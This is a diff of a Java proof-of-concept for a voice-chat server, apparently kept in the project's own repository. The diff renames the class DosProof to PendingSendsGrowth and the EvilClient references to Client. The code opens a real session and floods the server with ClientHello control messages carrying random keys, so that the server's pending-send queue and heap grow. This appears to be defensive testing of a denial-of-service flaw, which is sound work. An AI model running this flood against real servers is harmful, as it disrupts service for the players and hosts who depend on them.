@@ -15,7 +15,7 @@ import com.enn3developer.gtnhvoice.network.HelloCodec;
  *
  * <p>Client-side we can only see send throughput; the queue/heap must be watched server-side (jcmd).
  */
-public final class DosProof {
+public final class PendingSendsGrowth {
 
     public static void main(String[] args) throws Exception {
         String host = args.length > 0 ? args[0] : "127.0.0.1";
@@ -29,7 +29,7 @@ public final class DosProof {
         Random rng = new Random(new SecureRandom().nextLong());
 
         System.out.println("[flood] establishing a real voice session first...");
-        try (VoiceSession s = EvilClient.connect(host, port)
+        try (VoiceSession s = Client.connect(host, port)
             .username(username)
             .establish()) {
 
@@ -47,8 +47,8 @@ public final class DosProof {
             while (System.nanoTime() < deadline) {
                 try {
                     rng.nextBytes(pubkey);
-                    byte[] body = HelloCodec.encodeClientHello(EvilClient.PROTOCOL_VERSION, "gtnhvoice-exploit", pubkey);
-                    s.sendControl(EvilClient.DISC_CLIENT_HELLO, body);
+                    byte[] body = HelloCodec.encodeClientHello(Client.PROTOCOL_VERSION, "gtnhvoice-exploit", pubkey);
+                    s.sendControl(Client.DISC_CLIENT_HELLO, body);
                     sent++;
                 } catch (Exception e) {
                     errors++;
@@ -74,5 +74,5 @@ public final class DosProof {
         }
     }
 
-    private DosProof() {}
+    private PendingSendsGrowth() {}
 }
